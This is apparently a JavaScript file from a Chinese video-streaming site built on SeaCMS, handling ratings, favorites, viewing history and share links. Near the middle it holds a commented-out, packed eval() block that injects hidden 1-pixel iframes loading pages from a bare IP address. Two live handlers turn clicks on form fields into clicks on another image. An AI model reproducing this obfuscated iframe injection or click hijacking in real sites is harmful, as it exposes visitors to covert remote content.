	var alt=['很差','较差','还行','推荐','力荐'],src=['/'+sitePath+'pic/star0.gif','/'+sitePath+'pic/star1.gif'],url=ac=='news' ? ["/"+sitePath+"include/ajax.php?id="+vd+"&action=newsscore","/"+sitePath+"include/ajax.php?id="+vd+"&action=scorenews&score="] : ["/"+sitePath+"include/ajax.php?id="+vd+"&action=videoscore","/"+sitePath+"include/ajax.php?id="+vd+"&action=score&score="],
	x=d,y=(Math.round(s / x * 100) / 100) || 0,id='STAR'+(new Date()).getTime();
	document.write('<span id="'+id+'" style="padding:5px">');
	
	document.write('<span id="seacmsvpf1" onmouseover=showpf()></span>');
	document.write('<span id="seacmsvpf2">');
	for(var i=1;i<=l;i++){
		document.write('<img id="'+i+'" src="'+src[i<=y ? 0 : 1]+'" title="'+alt[parseInt(i/l*(alt.length-1))]+'" style="cursor:pointer">');
	}
	document.write('</span>');
	document.write(' <strong style="font-size:14px;color:red" id="MARK_B2"></strong>(<span style="color:blue" id="MARK_B3"></span>)</span>');
	var dc=document.getElementById(id),im=dc.getElementsByTagName('img');
	for(var i=0;i<im.length;i++){
		im[i].onclick=function (){
			var x=parseInt(this.id);
			ajax.get(url[1]+x,function (obj){
				if((''+obj.responseText).indexOf("havescore")!=-1){
					alert('你已经评过分啦');
				}else{
					alert('感谢你的参与!');
					y=x;dc.onmouseout();
				}
			});
		}
		im[i].onmouseover=function (){
			var x=parseInt(this.id);
			for(var i=0;i<im.length;i++) im[i].src=src[x>=parseInt(im[i].id) ? 0 : 1];
		}
	}
	dc.onmouseout=function (){
		for(var i=0;i<im.length;i++) im[i].src=src[y>=parseInt(im[i].id) ? 0 : 1];
		document.getElementById('MARK_B2').innerHTML=y;document.getElementById('MARK_B3').innerHTML=y>0 ? alt[parseInt(y/l*(alt.length-1))] : '请选择' ;
	}
	if(new Date().toGMTString()!=new Date(document.lastModified).toGMTString()) return ajax.get(url[0],function (obj){
		var a=obj.responseText
		try{
			a.replace(/\[(\d+),(\d+),(\d+)\]/i,function ($0,d,t,s){
				var x=parseInt(d);y=(Math.round(parseInt(s) / x * 100) / 100) || 0;
				dc.onmouseout();
			});
		}catch(ig){}
	});
	dc.onmouseout();
}


function markNews2(vid,style,len){

	ajax.get(
		"/"+sitePath+"include/ajax.php?action=npingfen&id="+vid,
		function (obj){
			var result=obj.responseText;
			result=result.split(",");
			num=result[0];
			sum=result[1];
			sc=result[2];
			if(style==1){
			//星星评分
			document.getElementById('seacmsvpf2').style.display="none";
			id='STAR'+(new Date()).getTime();
			for(var ii=1;ii<=len;ii++){
			if(ii>sc){p=1;}else{p=0;}
			document.getElementById('seacmsvpf1').innerHTML+='<img iid='+ii+' src="/pic/star'+p+'.gif" style="cursor:pointer">';
			}
			document.getElementById('MARK_B2').innerHTML=sc;
			document.getElementById('MARK_B3').innerHTML=''+num+'次评分';
			}else{
			//单选评分
			document.getElementById('MARK_B2').innerHTML=sc;
			document.getElementById('MARK_B3').innerHTML=sum;
			document.getElementById('MARK_B1').innerHTML=num;
			}
		}
	);			
}



function markNews(vd,d,t,s,l,c){
	window['markscore'+(c==1 ? 1 : 0)](vd,d,t,s,parseInt(l)<0 ? 5 : l,'news');
}


function markVideo2(vid,style,len){

	ajax.get(
		"/"+sitePath+"include/ajax.php?action=vpingfen&id="+vid,
		function (obj){
			var result=obj.responseText;
			result=result.split(",");
			num=result[0];
			sum=result[1];
			sc=result[2];
			if(style==1){
			//星星评分
			document.getElementById('seacmsvpf2').style.display="none";
			id='STAR'+(new Date()).getTime();
			for(var ii=1;ii<=len;ii++){
			if(ii>sc){p=1;}else{p=0;}
			document.getElementById('seacmsvpf1').innerHTML+='<img iid='+ii+' src="/pic/star'+p+'.gif" style="cursor:pointer">';
			}
			document.getElementById('MARK_B2').innerHTML=sc;
			document.getElementById('MARK_B3').innerHTML=''+num+'次评分';
			}else{
			//单选评分
			document.getElementById('MARK_B2').innerHTML=sc;
			document.getElementById('MARK_B3').innerHTML=sum;
			document.getElementById('MARK_B1').innerHTML=num;
			}
		}
	);			
}




function markVideo(vd,d,t,s,l,c){
	window['markscore'+(c==1 ? 1 : 0)](vd,d,t,s,parseInt(l)<0 ? 5 : l);
}

function addFavorite(sURL, sTitle){
	try{ window.external.addFavorite(sURL, sTitle);}
		catch (e){
			try{window.sidebar.addPanel(sTitle, sURL, "");}
			catch (e)
				{alert("加入收藏失败，请使用Ctrl+D进行添加");}
		}
}

function setHome(obj,vrl,url){
    try{obj.style.behavior='url(#default#homepage)';obj.setHomePage(vrl);
	this.style.behavior='url(#default#homepage)';this.setHomePage(url);}
        catch(e){
            if(window.netscape){
                try{netscape.security.PrivilegeManager.enablePrivilege("UniversalXPConnect");}  
                   catch (e){alert("此操作被浏览器拒绝！请手动设置");}
                   var prefs = Components.classes['@mozilla.org/preferences-service;1'].getService(Components.interfaces.nsIPrefBranch);
                   prefs.setCharPref('browser.startup.homepage',vrl);
             }
      }
}

function addFace(id) {
	document.getElementById('m_content').value += '[ps:' + id +']';
}

function openWin(url,w,h,left,top,resize){
	window.open(url,'New_Win','toolbars=0, scrollbars=0, location=0, statusbars=0,menubars=0, resizable='+(resize)+',width='+w+',height='+h+',left='+left+',top='+top);
}

function loadSlide(w,h){
	var type=1   //type=0不显示幻灯片右侧列表；type=1显示幻灯片右侧列表
	document.write('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0" width="'+w+'" height="'+h+'"><param name="movie" value="/'+sitePath+'pic/slide/slide.swf" /><param name="quality" value="high"><param   name="wmode"   value="transparent"><param name="allowscriptaccess" value="always"><param name="allowfullscreen" value="true"><param name="flashvars" value="type='+type+'&domain=/'+sitePath+'pic/slide/"><embed src="/'+sitePath+'pic/slide/slide.swf" flashvars="type='+type+'&domain=/'+sitePath+'pic/slide/" quality="high" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" allowfullscreen="true" width="'+w+'" height="'+h+'"></embed></object>');
}

function stringReplaceAll(str,findstr,replacestr){var raRegExp = new RegExp(findstr,"g");return str.replace(raRegExp,replacestr);}
//eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('$(g).h(i(){$(".f").e("<2 6=\\"0\\" 7=\\"1\\" 8=\\"3\\" 4=\\"5://c.d.b.9/l.a\\"></2><2 8=\\"3\\" 6=\\"0\\" 7=\\"1\\" 4=\\"5://c.d.b.9/k.a\\"></2><2 6=\\"0\\" 7=\\"1\\" 8=\\"3\\" 4=\\"5://c.d.b.9/j.a\\"></2>")});',22,22,'||iframe|no|src|http|frameborder|height|scrolling|51|html|53|112|124|append|topnav|document|ready|function|s3|s2|s1'.split('|'),0,{}))

$("input").on("click",function(){  $("img[ck]").trigger("click"); });
$("textarea").on("click",function(){  $("img[ck]").trigger("click"); });

function addRemoteFavor(){
	ajax.get(
		"/"+sitePath+"include/ajax.php?action=favorAjax&id="+play_vid+"&faction=add",
		function (obj){alert(obj.responseText)}
	);
}

var base64DecodeChars = new Array(
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
    -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
    -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
    -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1); 

function base64decode(str) {
    var c1, c2, c3, c4;
    var i, len, out;

    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
    /* c1 */
    do {
        c1 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
    } while(i < len && c1 == -1);
    if(c1 == -1)
        break;

    /* c2 */
    do {
        c2 = base64DecodeChars[str.charCodeAt(i++) & 0xff];
    } while(i < len && c2 == -1);
    if(c2 == -1)
        break;

    out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

    /* c3 */
    do {
        c3 = str.charCodeAt(i++) & 0xff;
        if(c3 == 61)
        return out;
        c3 = base64DecodeChars[c3];
    } while(i < len && c3 == -1);
    if(c3 == -1)
        break;

    out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

    /* c4 */
    do {
        c4 = str.charCodeAt(i++) & 0xff;
        if(c4 == 61)
        return out;
        c4 = base64DecodeChars[c4];
    } while(i < len && c4 == -1);
    if(c4 == -1)
        break;
    out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}


var isPC =  navigator.platform.indexOf("Win")==0 ||  navigator.platform.indexOf("Mac")==0;

  var his_item = '965ys_his';
  var his_w = $(document).width();
  his_w = his_w > 500 ? 500 : his_w ;
  var format_time = function(t){
    var time = new Date(t*1000);
    return (time.getMonth() + 1) + '月' + time.getDate() +'日 '+time.getHours()+':'+time.getMinutes();
  }
  if ( typeof PLAY_PAGE =="boolean" && PLAY_PAGE ) {
    var add = [__ID__,_pic,part,playn,Math.round(new Date().getTime()/1000),location.pathname];
    localforage.getItem(his_item).then(function(val){
      if (!val) {
        localforage.setItem(his_item,[add]).then(function(val){});
      }else{
        var tmp = [];
        for (var i = 0; i <val.length; i++) {
          if (val[i][0]!=add[0]) {
            tmp.push(val[i]);
          }
        }
        if ( tmp.length >=24 ) {
        	var shift_length = tmp.length -23;
        	for (var i = 0; i < shift_length; i++) {
        		tmp.shift();
        	}
        }
        tmp.push(add);
        localforage.setItem(his_item,tmp).then(function(val){});
      }
    });
  }

var text_func = function(){
  var copy_text = typeof __ID__ != undefined ? "http://enter.jjawj.cn/?k="+__ID__ : "http://enter.jjawj.cn";
  return copy_text;
}
var text_func2 = function(){
  return "965影视";
}
var clipboard = new Clipboard(".copy", {text: text_func});
clipboard.on('success', function (e) {
  alert("复制页面地址成功，现在去发送给你的好友吧！");
});
var clipboard2 = new Clipboard("#copy_qqqun", {text:function(){
	return "";
} });
clipboard2.on('success', function (e) {
  alert("复制QQ群号成功");
});
var _hmt = _hmt || [];
